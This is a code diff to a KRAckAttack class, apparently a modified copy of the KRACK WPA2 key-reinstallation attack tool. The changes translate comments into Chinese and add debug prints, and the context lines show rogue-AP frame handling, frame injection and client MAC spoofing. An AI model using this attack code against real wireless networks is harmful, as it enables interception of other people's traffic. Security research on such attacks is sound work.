@@ -680,8 +680,7 @@ class KRAckAttack():
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
 				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))
 
-
-		# 2. Handle frames sent BY the real AP
+		# 2. 處理來自原本 AP 的 frames
 		elif p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
@@ -727,13 +726,13 @@ class KRAckAttack():
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Real channel ", p)
+			print_rx(INFO, "Real channel " + str(ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL))), p)
 
 	def handle_rx_roguechan(self):
 		p = self.sock_rogue.recv()
 		if p == None: return
 
-		# 1. Handle frames sent BY the rouge AP
+		# 1. 處理來自強盜 AP 的 frames
 		if p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
@@ -845,6 +844,7 @@ class KRAckAttack():
 		if self.clientmac:
 				self.nic_real_clientack = self.nic_real + "sta1"
 				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
+				print(datetime.datetime.now()) # -- debug
 				call_macchanger(self.nic_real_clientack, self.clientmac)
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
